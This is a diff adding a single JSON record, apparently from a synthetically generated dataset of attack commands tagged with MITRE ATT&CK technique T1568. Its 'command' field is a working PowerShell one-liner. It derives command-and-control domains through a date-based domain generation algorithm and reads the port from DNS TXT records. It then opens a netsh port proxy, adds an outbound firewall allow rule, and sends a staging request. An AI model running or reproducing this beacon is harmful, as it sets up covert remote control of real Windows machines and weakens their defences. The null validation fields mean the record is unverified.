@@ -1,0 +1,21 @@
+{
+  "technique_id": "T1568",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "$seed='net';$date=(Get-Date -Format 'yyyyMMdd');$dgad=1..40|%{('gw{0}-{1}.org' -f $_,$date)};foreach($d in $dgad){try{$a=Resolve-DnsName $d -Type A -ErrorAction Stop;$t=Resolve-DnsName $d -Type TXT -ErrorAction SilentlyContinue;$port=([regex]::Match(($t.Strings -join ''),'p=(\\d{2,5})')).Groups[1].Value;if(!$port){$port=(Get-Random -Min 40000 -Max 50000)};$ip=($a|Get-Random).IPAddress;netsh interface portproxy set v4tov4 listenaddress=127.0.0.1 listenport=$port connectaddress=$ip connectport=$port;netsh advfirewall firewall add rule name='c2_dyn_'+$port dir=out action=allow protocol=TCP remoteip=$ip remoteport=$port;Invoke-WebRequest -Uri ('http://127.0.0.1:'+ $port +'/boot') -UseBasicParsing -Headers @{XD=$d} -TimeoutSec 5;break}catch{}}",
+  "explanation": "Uses DGA plus TXT records to dynamically derive the C2 port, resolves the A record for an IP, then sets a matching portproxy and sends a staging request.",
+  "rationale_steps": [
+    "Resolve TXT to extract a dynamic port and A record for IP binding.",
+    "Map local listener to the dynamic endpoint and initiate C2 bootstrap."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1568-0a23acf2-663213d4",
+  "source_prompt_hash": "0a23acf2",
+  "timestamp_utc": "2025-09-30T09:39:46.357850Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
